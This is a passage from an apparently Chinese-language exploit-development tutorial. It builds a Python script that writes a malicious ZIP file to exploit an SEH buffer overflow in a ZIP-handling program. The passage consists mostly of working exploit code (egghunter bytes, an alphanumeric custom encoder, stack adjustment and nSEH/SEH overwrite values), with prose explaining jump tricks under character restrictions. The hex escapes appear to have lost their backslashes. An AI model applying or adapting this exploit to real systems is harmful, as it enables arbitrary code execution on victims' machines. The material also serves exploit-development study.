    "x6dx51x59x5ax49x6fx36x6fx72x62x71x42x42x4a"
    "x66x46x56x38x74x73x78x49x4cx4bx4bx64x61x74"
    "x49x6fx47x63x31x4ex50x5ax77x4cx77x75x53x44"
    "x49x79x38x38x52x57x36x50x50x30x33x44x6cx4b"
    "x59x6ax4ex4fx32x55x38x64x4ex4fx70x75x6bx51"
    "x6bx4fx79x77x41x41")
    payload = egghunter
    payload += "A" * (nseh_offset - len(payload) - jump_offset)   # padding for nSEH
    # Offset the stack by 0x62C to start writing to a controlled area of memory
    #
    payload += "x54"                   # push esp;
    payload += "x58"                   # pop eax;
    payload += "x05x2dx07x01x01"   # add eax, 0x0101072D
    payload += "x2dx01x01x01x01"   # sub eax, 0x01010101
    payload += "x50"                   # push eax;
    payload += "x5c"                   # pop esp;
    # Write instructions for: push esp; pop eax; sub eax, 0xDEADBEEF; jmp eax
    #
                                        # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0x909090e0 into EAX
    payload += "x05x70x70x70x70"   # add eax, 0x70707070
    payload += "x05x70x20x20x20"   # add eax, 0x20202070
    payload += "x50"                   # push eax;
                                        # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0xffdeadbe into EAX
    payload += "x05x77x77x77x77"   # add eax, 0x77777777
    payload += "x05x37x25x57x77"   # add eax, 0x77572537
    payload += "x05x10x11x10x11"   # add eax, 0x11101110
    payload += "x50"                   # push eax;
                                        # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0xef2d5854 into EAX
    payload += "x05x43x47x1cx77"   # add eax, 0x771c4743
    payload += "x05x10x10x01x77"   # add eax, 0x77011010
    payload += "x05x01x01x10x01"   # add eax, 0x01100101
    payload += "x50"                   # push eax;
    payload += "A" * (nseh_offset - len(payload))   # padding for the rest of encoder
    payload += "x71x9bx70x9b"   # nSEH: jno $-99; jo $-99   => '9b' will actually be converted to 'a2', which is $-92
    payload += "x33x28x42x00"   # SEH
    payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev"
    payload += ".txt"
    print "[+] Length = " + str(len(payload))
    exploit = header_1 + payload + header_2 + payload + header_3
    mefile = open('cst.zip','w');
    mefile.write(exploit);
    mefile.close()
    print "[+] Exploit complete!"
执行之后：
太棒了，我们已经成功地利用有效字符编写出了想要的代码！ 现在只需跳回到该区域来执行就好了。
我们还需要将我们写入的临时0xDEADBEEF地址更改为实际的偏移量，前提是我们知道它是什么…但现在为时过早。
**跳转**
不幸的是，我们没有太多的空间可用于跳转：在我们的编码器代码之后只有5个字节，编码器代码之前是4个字节。所以，我们需要找到相应的指令，让我们跳转到刚写的代码。
事实证明，由于字符限制，实际上我们无法做太多的事情。 任何短的向后跳转指令都包含无效的字符，无法跳转至恰当的地方。所以，应该考虑是否重用之前用过的跳转。
下面来看看我们目前拥有的有效载荷。
我们需要发挥创造性。让我们重用SEH中的JNO跳转，以便再次回到我们控制的内存区域。我们可以在当前编码器有效载荷的开头部分添加一些NOP，然后通过自定义编码器用其他跳转指令将其覆盖，以将我们跳转到刚编写的代码之前。
哎，这样行得通吗？让我解释一下。
我们需要使用的跳转指令本来可以是简单的JMP $ -16（ xeb
xee），不幸的是它包含了无效的字符，因此不适用于我们…。但是，任何带有有效的字符的跳转指令都会让我们离的太远。
然而！我们可以使用自定义的编码器来处理它们，就像我们将egghunter的地址放置到EAX一样，只需要调整偏移量并修改代码即可。
首先，添加我们的JMP指令。然后，修改我们的原始堆栈，使SEH跳转能够准确到达我们的初始位置。最后，在编码器的开头部分添加一些NOP，它们之后将被所覆盖。下面我们具体介绍其工作原理。
这里，让我们先从自定义的编码器前面的NOP开始。 由于我们要求使用有效的字符集，因此可以使用 x41 x41（INC ECX）作为NOP。
接下来，进行堆栈调整。 从目前的状态来看，我们需要进一步偏移6个字节，以便写入到要覆盖的区域。为此，我们可以进行相应的调整。
最后，我们需要用编码器写入JNZ $ -16（ x75 xee）指令。 让我们用新的指令来替换最后两个 x90（记住这里使用的是little –
endianness，所以我们需要反过来写入）。
最后，代码将变成这样：
    #...snip...
    nseh_offset = 292
    jump_offset = 92
    #...snip...
    payload = egghunter
    payload += "A" * (nseh_offset - len(payload) - jump_offset)    # padding for nSEH
    payload += "x41x41"   # INC ECX (acts as NOPs, but using valid character set)
    # Offset the stack by 0x632 to start writing to a controlled area of memory
    #
    payload += "x54"                   # push esp;
    payload += "x58"                   # pop eax;
    payload += "x05x33x07x01x01"   # add eax, 0x01010733
    payload += "x2dx01x01x01x01"   # sub eax, 0x01010101
    payload += "x50"                   # push eax;
    payload += "x5c"                   # pop esp;
    # Write instructions for: push esp; pop eax; sub eax, 0xDEADBEEF; jmp eax; jnz 0xee
    #
                                        # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0xee7590e0 into EAX  ==>> '0xee75' represents 'JNZ $-16' instruction
    payload += "x05x70x70x74x77"   # add eax, 0x77747070
    payload += "x05x70x20x01x77"   # add eax, 0x77012070
    payload += "x50"                   # push eax;
                                        # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0xffdeadbe into EAX
    payload += "x05x77x77x77x77"   # add eax, 0x77777777
    payload += "x05x37x25x57x77"   # add eax, 0x77572537